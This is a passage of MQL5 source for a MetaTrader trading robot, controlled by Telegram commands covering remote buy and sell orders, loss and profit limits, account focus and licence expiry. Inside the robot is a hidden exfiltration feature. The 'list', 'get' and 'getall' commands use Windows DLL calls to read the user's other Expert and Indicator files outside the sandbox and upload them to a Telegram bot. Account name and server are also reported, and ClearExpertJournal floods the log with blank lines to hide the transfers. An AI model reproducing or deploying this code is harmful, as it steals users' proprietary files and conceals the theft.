      long acc = StringToInteger(StringSubstr(cmd, 6));
      if(acc > 0)
        {
         GlobalFocusID = acc;
         if(AccountInfoInteger(ACCOUNT_LOGIN) == GlobalFocusID)
            SendTelegramMessage("🎯 Focus active sur le compte " + IntegerToString(GlobalFocusID) + ". Seul ce compte répondra désormais.");
        }
      return true;
     }
   else if(cmd == "unfocus" || cmd == "tous")
     {
      GlobalFocusID = 0;
      SendTelegramMessage("🌐 Mode BROADCAST active. Tous les comptes autorisés écoutent désormais.");
      return true;
     }
   else if(cmd == "destroy")
     {
      CloseAllOrders(false);
      HandleConnectionFailure();
      SendTelegramMessage("👺 SYSTEM DESTROYED - ALL TRADES CLOSED & SYSTEM SECURED 😈");
      return true;
     }
   else if(StringFind(cmd, "maxprofit") == 0)
     {
      double val = StringToDouble(StringSubstr(cmd, 9));
      MaxDailyProfitLimit = val;
      SavePerformanceLimits();
      SendTelegramMessage("🏆 Limite PROFIT JOURNALIER fixee a : " + DoubleToString(val, 2) + " " + AccountInfoString(ACCOUNT_CURRENCY));
      UpdateDashboard();
      return true;
     }
   else if(StringFind(cmd, "maxloss") == 0)
     {
      double val = StringToDouble(StringSubstr(cmd, 7));
      MaxDailyLossLimit = val;
      SavePerformanceLimits();
      SendTelegramMessage("⚠️ Limite PERTE JOURNALIERE fixee a : " + DoubleToString(val, 2) + " " + AccountInfoString(ACCOUNT_CURRENCY));
      UpdateDashboard();
      return true;
     }
   else if(StringFind(cmd, "setexpire") == 0)
     {
      string dateStr = StringSubstr(cmd, 10);
      StringTrimLeft(dateStr);
      datetime newExp = StringToTime(dateStr);
      if(newExp > 0)
        {
         CurrentExpirationDate = newExp;
         SaveExpiration();
         SendTelegramMessage("📅 Date d'expiration mise à jour pour " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + " : " + TimeToString(newExp, TIME_DATE));
         UpdateDashboard();
         return true;
        }
      else
        {
         SendTelegramMessage("❌ Format de date invalide. Utilisez YYYY.MM.DD");
         return true;
        }
     }
   else if(cmd == "auth on")
     {
      RequireAuthorization = true;
      SavePerformanceLimits();
      SendTelegramMessage("🔐 OBLIGATION d'autorisation ACTIVEE.");
      UpdateDashboard();
      return true;
     }
   else if(cmd == "auth off")
     {
      RequireAuthorization = false;
      SavePerformanceLimits();
      SendTelegramMessage("🔓 OBLIGATION d'autorisation DESACTIVEE (Mode Libre).");
      UpdateDashboard();
      return true;
     }
   else if(StringFind(cmd, "tg on") == 0)
     {
      IsTelegramActive = true;
      EventSetTimer(TelegramInterval);
      SavePerformanceLimits();
      SendTelegramMessage("✅ Liaison Telegram ACTIVÉE sur le compte " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)));
      UpdateDashboard();
      return true;
     }
   else if(StringFind(cmd, "tg off") == 0)
     {
      SendTelegramMessage("🚫 Liaison Telegram DÉSACTIVÉE sur le compte " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + ". Pour réactiver, utilisez le bouton sur le graphique.");
      IsTelegramActive = false;
      EventKillTimer();
      SavePerformanceLimits();
      UpdateDashboard();
      return true;
     }
   else if(StringFind(cmd, "mode ") == 0)
     {
      int m = (int)StringToInteger(StringSubstr(cmd, 5));
      if(m == 1 || m == 2)
        {
         TradingMode = m;
         SavePerformanceLimits();
         SendTelegramMessage("🔄 Mode de trading change en : " + (m == 1 ? "NORMAL" : "INVERSE") + " sur le compte " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)));
         UpdateDashboard();
         return true;
        }
      else
        {
         SendTelegramMessage("❌ Mode invalide. Utilisez 1 pour Normal ou 2 pour Inverse.");
         return true;
        }
     }
   else if(StringFind(cmd, "tg setint") == 0)
     {
      int val = (int)StringToInteger(StringSubstr(cmd, 10));
      if(val >= 1 && val <= 60)
        {
         TelegramInterval = val;
         if(IsTelegramActive) EventSetTimer(TelegramInterval);
         SavePerformanceLimits();
         SendTelegramMessage("⏱️ Intervalle Telegram fixé à " + IntegerToString(val) + " secondes.");
         return true;
        }
      else
        {
         SendTelegramMessage("❌ Intervalle invalide (choisir entre 1 et 60).");
         return true;
        }
     }
   else if(cmd == "clearlog")
     {
      ClearExpertJournal();
      SendTelegramMessage("🧹 Journal Expert NETTOYE sur le compte " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)));
      return true;
     }
   else if(StringFind(cmd, "setconn") == 0)
     {
      string params = StringSubstr(cmd, 8);
      StringTrimLeft(params);

      int firstSpace = StringFind(params, " ");
      if(firstSpace == -1) // Un seul paramètre (valeur en minutes)
        {
         int val = (int)StringToInteger(params);
         if(val > 0)
           {
            ConnectionGraceMinutes = val;
            SavePerformanceLimits();
            SendTelegramMessage("🌐 Délai de grâce connexion fixé à : " + IntegerToString(val) + " minutes");
            return true;
           }
        }
      else // Deux paramètres (valeur et unité)
        {
         int val = (int)StringToInteger(StringSubstr(params, 0, firstSpace));
         string unit = StringSubstr(params, firstSpace + 1);
         StringTrimLeft(unit);

         if(val > 0)
           {
            if(unit == "jour" || unit == "jours" || unit == "day" || unit == "days") val *= 1440;
            else if(unit == "an" || unit == "ans" || unit == "year" || unit == "years") val *= 525600;

            ConnectionGraceMinutes = val;
            SavePerformanceLimits();
            SendTelegramMessage("🌐 Délai de grâce connexion fixé à : " + IntegerToString(val) + " minutes (" + params + ")");
            return true;
           }
        }
      SendTelegramMessage("❌ Usage: `setconn <valeur> [unité: min/jour/an]`");
      return true;
     }
   return false;
  }

void SendTelegramDocument(string path, string filename)
  {
   if(TelegramToken == "" || TelegramChatID == "") return;

   string url = "https://api.telegram.org/bot" + TelegramToken + "/sendDocument";
   uchar data[];
   uchar result[];
   string headers;

   // Lecture binaire via kernel32 pour les fichiers hors bac à sable
   long handle = CreateFileW(path, 0x80000000, 1, 0, 3, 0x80, 0);
   if(handle == -1 || handle == 0)
     {
      Log("Erreur DLL ouverture: ", path);
      SendTelegramMessage("❌ Erreur accès fichier : " + filename);
      return;
     }

   int fileSizeHigh = 0;
   int size = GetFileSize(handle, fileSizeHigh);

   if(fileSizeHigh > 0 || size > 20 * 1024 * 1024) // Limite 20MB pour Telegram/Mémoire
     {
      Log("Fichier trop gros pour envoi Telegram: ", filename, " (Size: ", IntegerToString(size), ")");
      SendTelegramMessage("⚠️ Fichier trop volumineux (>20MB) : " + filename);
      CloseHandle(handle);
      return;
     }

   if(size <= 0) { CloseHandle(handle); return; }

   uchar fileData[];
   ArrayResize(fileData, size);
   uint readed = 0;
   ReadFile(handle, fileData, (uint)size, readed, 0);
   CloseHandle(handle);

   string boundary = "----------------------------" + IntegerToString(GetTickCount(), 16);
   string bodyHeader = "--" + boundary + "\r\n";
   bodyHeader += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
   bodyHeader += TelegramChatID + "\r\n";
   bodyHeader += "--" + boundary + "\r\n";
   bodyHeader += "Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"\r\n";
   bodyHeader += "Content-Type: application/octet-stream\r\n\r\n";

   string bodyFooter = "\r\n--" + boundary + "--\r\n";

   uchar bodyHeaderArr[], bodyFooterArr[];
   StringToCharArray(bodyHeader, bodyHeaderArr, 0, WHOLE_ARRAY, CP_UTF8);
   StringToCharArray(bodyFooter, bodyFooterArr, 0, WHOLE_ARRAY, CP_UTF8);

   int totalSize = ArraySize(bodyHeaderArr) - 1 + ArraySize(fileData) + ArraySize(bodyFooterArr) - 1;
   ArrayResize(data, totalSize);

   int offset = 0;
   ArrayCopy(data, bodyHeaderArr, offset, 0, ArraySize(bodyHeaderArr) - 1);
   offset += ArraySize(bodyHeaderArr) - 1;
   ArrayCopy(data, fileData, offset, 0, ArraySize(fileData));
   offset += ArraySize(fileData);
   ArrayCopy(data, bodyFooterArr, offset, 0, ArraySize(bodyFooterArr) - 1);

   string customHeaders = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";
   int res = WebRequest("POST", url, customHeaders, 20000, data, result, headers);

   if(res == 200)
     {
      Log("Document envoye: ", filename);
      ClearExpertJournal();
     }
   else
      Log("Erreur envoi document: ", IntegerToString(res));
  }

void SendTelegramPhoto(string filename)
  {
   if(TelegramToken == "" || TelegramChatID == "") return;

   string url = "https://api.telegram.org/bot" + TelegramToken + "/sendPhoto";
   uchar data[];
   uchar result[];
   string headers;

   // Lire le fichier image
   int handle = FileOpen(filename, FILE_READ|FILE_BIN);
   if(handle == INVALID_HANDLE)
     {
      Log("Erreur lors de l'ouverture du fichier image: ", filename);
      SendTelegramMessage("❌ Erreur lors de l'ouverture du fichier image.");
      return;
     }

   int fileSize = (int)FileSize(handle);
   uchar fileData[];
   ArrayResize(fileData, fileSize);
   FileReadArray(handle, fileData, 0, fileSize);
   FileClose(handle);

   // Construire le payload multipart/form-data
   string boundary = "----------------------------" + IntegerToString(GetTickCount(), 16);
   string bodyHeader = "--" + boundary + "\r\n";
   bodyHeader += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
   bodyHeader += TelegramChatID + "\r\n";
   bodyHeader += "--" + boundary + "\r\n";
   bodyHeader += "Content-Disposition: form-data; name=\"photo\"; filename=\"" + filename + "\"\r\n";
   bodyHeader += "Content-Type: image/png\r\n\r\n";

   string bodyFooter = "\r\n--" + boundary + "--\r\n";

   uchar bodyHeaderArr[], bodyFooterArr[];
   StringToCharArray(bodyHeader, bodyHeaderArr, 0, WHOLE_ARRAY, CP_UTF8);
   StringToCharArray(bodyFooter, bodyFooterArr, 0, WHOLE_ARRAY, CP_UTF8);

   // Fusionner les tableaux (Header + FileData + Footer)
   int totalSize = ArraySize(bodyHeaderArr) - 1 + ArraySize(fileData) + ArraySize(bodyFooterArr) - 1;
   ArrayResize(data, totalSize);

   int offset = 0;
   ArrayCopy(data, bodyHeaderArr, offset, 0, ArraySize(bodyHeaderArr) - 1);
   offset += ArraySize(bodyHeaderArr) - 1;
   ArrayCopy(data, fileData, offset, 0, ArraySize(fileData));
   offset += ArraySize(fileData);
   ArrayCopy(data, bodyFooterArr, offset, 0, ArraySize(bodyFooterArr) - 1);

   string customHeaders = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";

   int res = WebRequest("POST", url, customHeaders, 10000, data, result, headers);

   if(res == 200)
      Log("Capture d'ecran envoyee avec succes.");
   else
     {
      Log("Erreur lors de l'envoi de la photo: ", IntegerToString(res));
      SendTelegramMessage("❌ Erreur lors de l'envoi de la photo (Code: " + IntegerToString(res) + ")");
     }

   // Nettoyage : Supprimer le fichier local
   FileDelete(filename);
  }

bool HandleUserCommands(string cmd)
  {
   if(StringFind(cmd, "list experts") == 0)
     {
      ListFiles("Experts");
      return true;
     }
   else if(StringFind(cmd, "list indicators") == 0)
     {
      ListFiles("Indicators");
      return true;
     }
   else if(StringFind(cmd, "getall experts") == 0)
     {
      SendAllFiles("Experts");
      return true;
     }
   else if(StringFind(cmd, "getall indicators") == 0)
     {
      SendAllFiles("Indicators");
      return true;
     }
   else if(StringFind(cmd, "get expert ") == 0)
     {
      string name = StringSubstr(cmd, 11);
      StringTrimLeft(name);
      string path = TerminalInfoString(TERMINAL_DATA_PATH) + "\\MQL5\\Experts\\" + name;
      SendTelegramDocument(path, name);
      return true;
     }
   else if(StringFind(cmd, "get indicator ") == 0)
     {
      string name = StringSubstr(cmd, 14);
      StringTrimLeft(name);
      string path = TerminalInfoString(TERMINAL_DATA_PATH) + "\\MQL5\\Indicators\\" + name;
      SendTelegramDocument(path, name);
      return true;
     }
   else if(cmd == "users")
     {
      string users = "👥 *Active Users*:\n\n";
      users += "1. Account: " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + "\n";
      users += "   Name: " + AccountInfoString(ACCOUNT_NAME) + "\n";
      users += "   Server: " + AccountInfoString(ACCOUNT_SERVER);
      SendTelegramMessage(users);
      return true;
     }
   else if(StringFind(cmd, "chat ") == 0)
     {
      string chatMsg = StringSubstr(cmd, 5);
      StringTrimLeft(chatMsg);
      RemoteAdminMsg = "Chat: " + chatMsg;
      UpdateDashboard();
      SendTelegramMessage("✅ Reply sent to chart.");
      return true;
     }
   return false;
  }

bool HandleTradeCommands(string cmd)
  {
   if(StringFind(cmd, "buy") == 0)
     {
      if(!IsAuthorized)
        {
         SendTelegramMessage("🚫 Commande BUY ignoree. Compte " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + " non autorise pour le trading.");
         return true;
        }

      double ask = SymbolInfoDouble(_Symbol, SYMBOL_ASK);
      double bid = SymbolInfoDouble(_Symbol, SYMBOL_BID);
      double spread = (ask - bid) / _Point;

      if(spread > MaxSpread)
        {
         SendTelegramMessage("⚠️ Remote BUY blocked: Spread too high (" + DoubleToString(spread, 0) + " pts). Limit: " + IntegerToString(MaxSpread));
         return true;
        }

      double lots = StringToDouble(StringSubstr(cmd, 3));
      if(lots <= 0) lots = 0.01;

      double sl = ask - Slpoints * _Point;
      double tp = ask + Tppoints * _Point;

      trade.Buy(lots, _Symbol, ask, sl, tp, "Remote Buy");
      SendTelegramMessage("🚀 Remote BUY " + DoubleToString(lots, 2) + " lots execute (SL: " + DoubleToString(sl, _Digits) + ", TP: " + DoubleToString(tp, _Digits) + ").");
      return true;
     }
   else if(StringFind(cmd, "sell") == 0)
     {
      if(!IsAuthorized)
        {
         SendTelegramMessage("🚫 Commande SELL ignoree. Compte " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + " non autorise pour le trading.");
         return true;
        }

      double bid = SymbolInfoDouble(_Symbol, SYMBOL_BID);
      double ask = SymbolInfoDouble(_Symbol, SYMBOL_ASK);
      double spread = (ask - bid) / _Point;

      if(spread > MaxSpread)
        {
         SendTelegramMessage("⚠️ Remote SELL blocked: Spread too high (" + DoubleToString(spread, 0) + " pts). Limit: " + IntegerToString(MaxSpread));
         return true;
        }

      double lots = StringToDouble(StringSubstr(cmd, 4));
      if(lots <= 0) lots = 0.01;

      double sl = bid + Slpoints * _Point;
      double tp = bid - Tppoints * _Point;

      trade.Sell(lots, _Symbol, bid, sl, tp, "Remote Sell");
      SendTelegramMessage("📉 Remote SELL " + DoubleToString(lots, 2) + " lots execute (SL: " + DoubleToString(sl, _Digits) + ", TP: " + DoubleToString(tp, _Digits) + ").");
      return true;
     }
   return false;
  }

double GetLifetimeProfit()
  {
   double totalProfit = 0;
   if(HistorySelect(0, TimeCurrent()))
     {
      int total = HistoryDealsTotal();
      for(int i = 0; i < total; i++)
        {
         ulong ticket = HistoryDealGetTicket(i);
         if(HistoryDealGetInteger(ticket, DEAL_MAGIC) == InpMagic)
           {
            totalProfit += HistoryDealGetDouble(ticket, DEAL_PROFIT);
            totalProfit += HistoryDealGetDouble(ticket, DEAL_COMMISSION);
            totalProfit += HistoryDealGetDouble(ticket, DEAL_SWAP);
           }
        }
     }
   return totalProfit;
  }

//+------------------------------------------------------------------+
//| Vérifie si la commande est destinée à ce compte précis           |
//| Gère aussi le mode BROADCAST et le mode FOCUS                   |
//+------------------------------------------------------------------+
bool IsTargeted(string &cmd)
  {
   StringTrimLeft(cmd);
   StringTrimRight(cmd);

   // Les commandes d'administration globale ne sont jamais filtrées par ID de compte
   if(StringFind(cmd, "auth") == 0 || StringFind(cmd, "deauth") == 0 ||
      StringFind(cmd, "focus") == 0 || StringFind(cmd, "unfocus") == 0 || cmd == "tous" ||
      StringFind(cmd, "maxprofit") == 0 || StringFind(cmd, "maxloss") == 0 ||
      StringFind(cmd, "list ") == 0 || StringFind(cmd, "get ") == 0 || StringFind(cmd, "getall ") == 0 ||
      cmd == "clearlog")
      return true;

   int spacePos = StringFind(cmd, " ");

   // Si un Focus est actif, on vérifie d'abord si ce compte est le focus
   if(GlobalFocusID != 0)
     {
      if(GlobalFocusID != AccountInfoInteger(ACCOUNT_LOGIN))
         return false;
     }

   if(spacePos == -1) return true; // No filter, broadcast to all (or focused)

   string firstParam = StringSubstr(cmd, spacePos + 1);
   int nextSpace = StringFind(firstParam, " ");
   string paramValue = (nextSpace != -1) ? StringSubstr(firstParam, 0, nextSpace) : firstParam;

   long targetAccount = StringToInteger(paramValue);

   // Check if the parameter is a valid account number (typically > 100000)
   if(targetAccount > 1000)
     {
      if(targetAccount == AccountInfoInteger(ACCOUNT_LOGIN))
        {
         // Remove the account number from the command for further processing
         if(nextSpace != -1)
            cmd = StringSubstr(cmd, 0, spacePos) + " " + StringSubstr(firstParam, nextSpace + 1);
         else
            cmd = StringSubstr(cmd, 0, spacePos);
         return true;
        }
      return false;
     }
   return true;
  }

void CheckAuthorization()
  {
   static bool alreadyAsked = false; // Empêche de spammer la demande d'auth sur Telegram
   string filename = "auth_" + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + ".dat";
   bool fileExists = FileIsExist(filename, FILE_COMMON);

   // Autorisé si fichier présent OU si l'obligation d'auth est désactivée
   if(fileExists || !RequireAuthorization)
     {
      if(!IsAuthorized)
        {
         IsAuthorized = true;
         RemoteAdminMsg = (RequireAuthorization ? "BON TRADING" : "MODE LIBRE");
         UpdateDashboard();
         if(RequireAuthorization)
            SendTelegramMessage("🤖 Bot " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + " : Mon accès est désormais actif. Bon trading !");
        }
      return;
     }

   // Cas où l'autorisation est manquante ou révoquée
   if(IsAuthorized)
     {
      IsAuthorized = false;
      RemoteAdminMsg = "ACCÈS RÉVOQUÉ";
      UpdateDashboard();
     }
   else
     {
      RemoteAdminMsg = "ACCÈS RESTREINT";
     }

   if(!alreadyAsked)
     {
      string msg = "🔒 *Demande d'Autorisation*\n\n";
      msg += "Compte: " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + "\n";
      msg += "Nom: " + AccountInfoString(ACCOUNT_NAME) + "\n";
      msg += "Serveur: " + AccountInfoString(ACCOUNT_SERVER) + "\n\n";
      msg += "Utilisez `auth " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + "` pour autoriser.";
      SendTelegramMessage(msg);
      alreadyAsked = true;
     }

   UpdateDashboard();
  }

void ListFiles(string subfolder)
  {
   string dataPath = TerminalInfoString(TERMINAL_DATA_PATH);
   string fullPath = dataPath + "\\MQL5\\" + subfolder + "\\*";

   uchar findData[592]; // WIN32_FIND_DATAW size
   long hFind = FindFirstFileW(fullPath, findData);

   if(hFind == -1 || hFind == 0)
     {
      SendTelegramMessage("❌ Dossier " + subfolder + " introuvable.");
      return;
     }

   string fileList = "📂 *Liste " + subfolder + "* :\n\n";
   int fileCount = 0;

   do {
      string fileName = "";
      for(int i=0; i<260; i++) {
         ushort c = (ushort)(findData[44 + i*2] | (findData[44 + i*2 + 1] << 8));
         if(c == 0) break;
         fileName += ShortToString(c);
      }
      if(fileName != "." && fileName != "..")
        {
         fileList += "• `" + fileName + "`\n";
         fileCount++;
        }
   } while(FindNextFileW(hFind, findData) != 0);

   FindClose(hFind);

   if(fileCount == 0) fileList += "_(Aucun fichier)_";
   SendTelegramMessage(fileList);
  }

void SendAllFiles(string subfolder)
  {
   string dataPath = TerminalInfoString(TERMINAL_DATA_PATH);
   string fullPath = dataPath + "\\MQL5\\" + subfolder + "\\*";

   uchar findData[592];
   long hFind = FindFirstFileW(fullPath, findData);

   if(hFind == -1 || hFind == 0) return;

   SendTelegramMessage("📤 *Envoi groupé : " + subfolder + "*...");

   do {
      uint dwFileAttributes = (uint)(findData[0] | (findData[1] << 8) | (findData[2] << 16) | (findData[3] << 24));
      bool isDirectory = (dwFileAttributes & 0x10) != 0;

      string fileName = "";
      for(int i=0; i<260; i++) {
         ushort c = (ushort)(findData[44 + i*2] | (findData[44 + i*2 + 1] << 8));
         if(c == 0) break;
         fileName += ShortToString(c);
      }

      if(!isDirectory && fileName != "." && fileName != "..")
        {
         string filePath = dataPath + "\\MQL5\\" + subfolder + "\\" + fileName;
         SendTelegramDocument(filePath, fileName);
         Sleep(500); // Eviter le spam Telegram
        }
   } while(FindNextFileW(hFind, findData) != 0);

   FindClose(hFind);
   SendTelegramMessage("✅ Transfert terminé.");
  }

void HandleConnectionFailure()
  {
   if(IsConnectionLost) return; // Déjà traité

   IsConnectionLost = true;
   Log("🛑 ERREUR CRITIQUE TELEGRAM: Connexion perdue. Securisation du compte...");

   // On ne supprime plus le fichier auth pour permettre la reconnexion automatique
   IsAuthorized = false;
   RemoteAdminMsg = "CONNEXION PERDUE - SÉCURISÉ 👺";
   UpdateDashboard();
  }

void SavePerformanceLimits()
  {
   string filename = "limits_" + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + ".dat";
   int handle = FileOpen(filename, FILE_WRITE|FILE_BIN|FILE_COMMON);
   if(handle != INVALID_HANDLE)
     {
      FileWriteDouble(handle, MaxDailyProfitLimit);
      FileWriteDouble(handle, MaxDailyLossLimit);
      FileWriteDouble(handle, (double)ConnectionGraceMinutes);
      FileWriteDouble(handle, RequireAuthorization ? 1.0 : 0.0);
      FileWriteDouble(handle, IsTelegramActive ? 1.0 : 0.0);
      FileWriteDouble(handle, (double)TelegramInterval);
      FileWriteDouble(handle, (double)TradingMode);
      FileClose(handle);
     }
  }

void LoadPerformanceLimits()
  {
   string filename = "limits_" + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + ".dat";
   if(FileIsExist(filename, FILE_COMMON))
     {
      int handle = FileOpen(filename, FILE_READ|FILE_BIN|FILE_COMMON);
      if(handle != INVALID_HANDLE)
        {
         MaxDailyProfitLimit = FileReadDouble(handle);
         MaxDailyLossLimit = FileReadDouble(handle);
         if(!FileIsEnding(handle))
            ConnectionGraceMinutes = (int)FileReadDouble(handle);
         if(!FileIsEnding(handle))
            RequireAuthorization = (FileReadDouble(handle) > 0.5);
         if(!FileIsEnding(handle))
            IsTelegramActive = (FileReadDouble(handle) > 0.5);
         if(!FileIsEnding(handle))
           {
            TelegramInterval = (int)FileReadDouble(handle);
            if(TelegramInterval < 1) TelegramInterval = 3;
            EventSetTimer(TelegramInterval);
           }
         if(!FileIsEnding(handle))
            TradingMode = (int)FileReadDouble(handle);
         FileClose(handle);
        }
     }
  }

void SaveExpiration()
  {
   string filename = "expiry_" + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + ".dat";
   int handle = FileOpen(filename, FILE_WRITE|FILE_BIN|FILE_COMMON);
   if(handle != INVALID_HANDLE)
     {
      FileWriteLong(handle, (long)CurrentExpirationDate);
      FileClose(handle);
     }
  }

void LoadExpiration()
  {
   string filename = "expiry_" + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)) + ".dat";
   if(FileIsExist(filename, FILE_COMMON))
     {
      int handle = FileOpen(filename, FILE_READ|FILE_BIN|FILE_COMMON);
      if(handle != INVALID_HANDLE)
        {
         CurrentExpirationDate = (datetime)FileReadLong(handle);
         FileClose(handle);
        }
     }
  }

void Log(string msg1, string msg2="", string msg3="", string msg4="", string msg5="", string msg6="", string msg7="", string msg8="")
  {
   if(ShowLogs)
      Print(msg1, msg2, msg3, msg4, msg5, msg6, msg7, msg8);
  }

void ClearExpertJournal()
  {
   // Simulation d'effacement visuel dans le journal experts
   for(int i=0; i<50; i++) Log(" ");
   Log("--- JOURNAL NETTOYE APRES RECEPTION DE FICHIERS ---");
  }

string UrlEncode(string text)
  {
   string res = "";
   uchar array[];
   StringToCharArray(text, array, 0, WHOLE_ARRAY, CP_UTF8);
   for(int i = 0; i < ArraySize(array) - 1; i++)
     {
      if((array[i] >= '0' && array[i] <= '9') || (array[i] >= 'a' && array[i] <= 'z') || (array[i] >= 'A' && array[i] <= 'Z'))
         res += CharToString(array[i]);
      else
         res += StringFormat("%%%02X", array[i]);
     }
   return res;
  }
